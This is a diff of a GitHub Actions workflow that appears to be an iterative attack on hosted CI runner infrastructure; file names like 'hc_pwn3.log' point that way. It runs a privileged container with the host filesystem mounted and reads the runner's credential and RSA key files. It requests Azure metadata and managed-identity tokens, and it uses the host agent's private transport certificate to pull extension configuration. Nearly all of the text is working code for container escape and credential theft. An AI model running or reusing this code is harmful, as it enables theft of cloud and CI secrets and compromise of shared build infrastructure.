@@ -21,34 +21,28 @@ jobs:
           HC_JWT=$(echo "$RESPONSE" | jq -r '.value' 2>/dev/null)
           HC_JWT_LEN=$(printf '%s' "$HC_JWT" | wc -c)
           echo "HC_JWT_LEN=$HC_JWT_LEN"
-          echo "HC_JWT_PREFIX=$(printf '%s' "$HC_JWT" | head -c 60)"
           echo "hc_jwt=$HC_JWT" >> "$GITHUB_OUTPUT"
 
-      - name: "Step 2: Privileged docker - dynamic alloc + HC probe + creds"
-        env:
-          HC_OIDC_TOKEN: ${{ steps.hc_token.outputs.hc_jwt }}
+      - name: "Step 2: Write inner script to disk"
         run: |
-          # Encode inner script as base64 to avoid quoting issues
-          INNER_B64=$(base64 -w0 << 'INNER_SCRIPT_EOF'
+          cat > /tmp/inner_v13.sh << 'ENDOFSCRIPT'
 #!/bin/sh
 set -x
-
 apk add --no-cache curl openssl jq 2>&1
 
 echo "=== IMDS TAGS - THIS RUN ==="
 IMDS_RAW=$(curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null)
 ALLOC_ID=$(printf '%s' "$IMDS_RAW" | jq -r '.compute.tagsList[]? | select(.name=="hosted_compute.allocation_id") | .value' 2>/dev/null)
 BASE_RO_URL=$(printf '%s' "$IMDS_RAW" | jq -r '.compute.tagsList[]? | select(.name=="hosted_compute.base_ro_url") | .value' 2>/dev/null)
-SUB_ID=$(printf '%s' "$IMDS_RAW" | jq -r '.compute.subscriptionId' 2>/dev/null)
-VM_NAME=$(printf '%s' "$IMDS_RAW" | jq -r '.compute.name' 2>/dev/null)
 VM_ID=$(printf '%s' "$IMDS_RAW" | jq -r '.compute.vmId' 2>/dev/null)
+VM_NAME=$(printf '%s' "$IMDS_RAW" | jq -r '.compute.name' 2>/dev/null)
+SUB_ID=$(printf '%s' "$IMDS_RAW" | jq -r '.compute.subscriptionId' 2>/dev/null)
 QUOTA_ID=$(printf '%s' "$IMDS_RAW" | jq -r '.compute.tagsList[]? | select(.name=="hosted_compute.quota_id") | .value' 2>/dev/null)
-
 echo "ALLOC_ID=$ALLOC_ID"
 echo "BASE_RO_URL=$BASE_RO_URL"
-echo "SUB_ID=$SUB_ID"
-echo "VM_NAME=$VM_NAME"
 echo "VM_ID=$VM_ID"
+echo "VM_NAME=$VM_NAME"
+echo "SUB_ID=$SUB_ID"
 echo "QUOTA_ID=$QUOTA_ID"
 
 echo "=== MSI TOKEN ATTEMPTS ==="
@@ -84,21 +78,20 @@ else
   echo "--- $ORCH_BASE/ root ---"
   curl -sv -H "Authorization: Bearer $HC_JWT" "${ORCH_BASE}/" 2>&1 | tail -20
 
-  echo "--- $BASE_RO_URL/vms/$VM_ID (by vmId) ---"
+  echo "--- $BASE_RO_URL/vms/$VM_ID ---"
   curl -sv -H "Authorization: Bearer $HC_JWT" "${BASE_RO_URL}/vms/${VM_ID}" 2>&1 | tail -15
+
+  echo "--- $BASE_RO_URL/quotas/$QUOTA_ID ---"
+  curl -sv -H "Authorization: Bearer $HC_JWT" "${BASE_RO_URL}/quotas/${QUOTA_ID}" 2>&1 | tail -15
 fi
 
 echo "=== RUNNER CREDENTIALS ==="
-echo "--- .credentials ---"
-cat /host/home/runner/.credentials 2>/dev/null || echo NOT_FOUND
-echo "--- .credentials_rsaparams ---"
-cat /host/home/runner/.credentials_rsaparams 2>/dev/null || echo NOT_FOUND
-echo "--- .runner ---"
-cat /host/home/runner/.runner 2>/dev/null || echo NOT_FOUND
-echo "--- runner ls ---"
+cat /host/home/runner/.credentials 2>/dev/null || echo NOT_FOUND_credentials
+cat /host/home/runner/.credentials_rsaparams 2>/dev/null || echo NOT_FOUND_rsaparams
+cat /host/home/runner/.runner 2>/dev/null || echo NOT_FOUND_runner
 ls -la /host/home/runner/ 2>/dev/null
 ls -la /host/home/runner/work/_temp/ 2>/dev/null | head -20
-find /host/home/runner/work/_temp/ -name "*.json" 2>/dev/null | head -10 | xargs cat 2>/dev/null | head -100
+find /host/home/runner/work/_temp/ -name "*.json" 2>/dev/null | head -5 | xargs -I{} sh -c 'echo "=== {} ==="; cat {}' 2>/dev/null
 
 echo "=== WAAGENT EXTENSIONS ==="
 ls /host/var/lib/waagent/ 2>/dev/null
@@ -108,30 +101,36 @@ echo "EXT_URL=$EXT_URL"
 if [ -n "$EXT_URL" ]; then
   EXT_XML=$(curl -s --cert /host/var/lib/waagent/TransportCert.pem --key /host/var/lib/waagent/TransportPrivate.pem -H "x-ms-version: 2012-11-30" "$EXT_URL" 2>/dev/null)
   echo "EXT_XML_LEN=${#EXT_XML}"
-  printf '%s\n' "$EXT_XML" | grep -i "primer\|hosted\|github\|token\|secret\|key\|auth\|credential\|setting" | head -40
-  printf '%s\n' "$EXT_XML" | head -80
+  printf '%s\n' "$EXT_XML" | head -100
 fi
 
 echo "=== ATTESTED DOCUMENT ==="
 ATT=$(curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01" 2>/dev/null)
-echo "ATT=$ATT" | head -c 2000
+echo "ATT_LEN=${#ATT}"
+printf '%s' "$ATT" | jq . 2>/dev/null | head -20
 
 echo "=== PRIMER STATUS ==="
 ls -la /host/opt/primer/ 2>/dev/null
 cat /host/tmp/hc_pwn3.log 2>/dev/null && echo PWN3_LOG_FOUND || echo PWN3_LOG_NOT_FOUND
 
 echo "=== DONE v13 ==="
-INNER_SCRIPT_EOF
-          )
+ENDOFSCRIPT
+          chmod +x /tmp/inner_v13.sh
+
+      - name: "Step 3: Run privileged docker with inner script"
+        env:
+          HC_OIDC_TOKEN: ${{ steps.hc_token.outputs.hc_jwt }}
+        run: |
           docker run --rm --privileged --pid=host --network=host \
             -v /:/host \
+            -v /tmp/inner_v13.sh:/inner.sh \
             -e HC_OIDC_TOKEN="${HC_OIDC_TOKEN}" \
             alpine:latest \
-            /bin/sh -c "echo '$INNER_B64' | base64 -d > /tmp/inner.sh && chmod +x /tmp/inner.sh && /tmp/inner.sh"
+            /bin/sh /inner.sh
 
-      - name: "Step 3: IMDS from runner host + ENV"
+      - name: "Step 4: IMDS + MSI from runner + ENV"
         run: |
-          echo "=== STEP 3: IMDS ==="
+          echo "=== STEP 4: IMDS from runner ==="
           curl -sf -H "Metadata: true" \
             "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq '{
               vmId: .compute.vmId,
@@ -140,9 +139,10 @@ INNER_SCRIPT_EOF
               imageRef: .compute.storageProfile.imageReference.id,
               tags: .compute.tags
             }' || true
-          echo "=== MSI direct from runner ==="
+          echo "=== MSI from runner ==="
           curl -sf -H "Metadata: true" \
-            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq . || true
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" || true
+          echo ""
           echo "=== ENV ==="
           env | grep -iE "ACTIONS|GITHUB|RUNNER" | grep -v "_TOKEN_REQUEST" | grep -v "SECRET" || true
-          cat /tmp/hc_pwn3.log 2>/dev/null && echo "PWN3_LOG_HOST_FOUND" || echo "PWN3_LOG_HOST_NOT_FOUND"
+          cat /tmp/hc_pwn3.log 2>/dev/null && echo "PWN3_LOG_FOUND" || echo "PWN3_LOG_NOT_FOUND"
